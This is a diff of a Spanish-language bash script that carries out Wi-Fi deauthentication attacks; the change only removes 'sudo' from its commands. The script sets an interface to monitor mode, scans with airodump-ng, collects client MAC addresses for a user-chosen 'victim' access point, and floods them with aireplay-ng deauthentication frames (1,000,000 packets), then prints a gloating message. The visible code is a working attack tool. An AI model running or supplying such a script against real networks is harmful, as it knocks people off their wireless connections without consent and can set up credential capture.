@@ -44,9 +44,9 @@ modo_monitor
 trap ctrl_c INT
 function ctrl_c(){
 	printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
-	sudo ifconfig $interface down
-	sudo iwconfig $interface mode Managed
-	sudo ifconfig $interface up
+	ifconfig $interface down
+	iwconfig $interface mode Managed
+	ifconfig $interface up
 	escape
 }
 
@@ -54,17 +54,17 @@ modo_monitor ()
 {
 printf "${yellowColour}[#]${endColour}${greenColour} Configurando modo monitor ${endColour}\n"
 sleep 1
-sudo ifconfig $interface down
-sudo iwconfig $interface mode monitor
-sudo ifconfig $interface up
+ifconfig $interface down
+iwconfig $interface mode monitor
+ifconfig $interface up
 inicio_ataque
 }
 
 olfateo ()
 {
-sudo airodump-ng --bssid $1 --channel $2 --write captura $interface &
+airodump-ng --bssid $1 --channel $2 --write captura $interface &
 sleep 5
-sudo killall airodump-ng 
+killall airodump-ng 
 sleep 1
 ataque
 }
@@ -79,7 +79,7 @@ lineas=$var
 resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 	if [ "$resultado" = ":" ]; then
 	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
-	sudo aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
+	aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
 	else
 	sleep 1
         printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
@@ -99,9 +99,9 @@ inicio_ataque ()
 sleep 1
 printf "${yellowColour}[#]${endColour}${purpleColour} Escaneando redes.... ${endColour}\n"
 sleep 2
-sudo airodump-ng $interface &
+airodump-ng $interface &
 sleep 3
-sudo killall airodump-ng
+killall airodump-ng
 printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el ${purpleColiour}BSSID de su${endColour}${endColour}${redColour} victima: ${endColour}"
 read victima
 printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el canal ${endColour}${redColour}(CH)${endColour}${grayColour} de su ${endColour}${redColour} victima: ${endColour}"
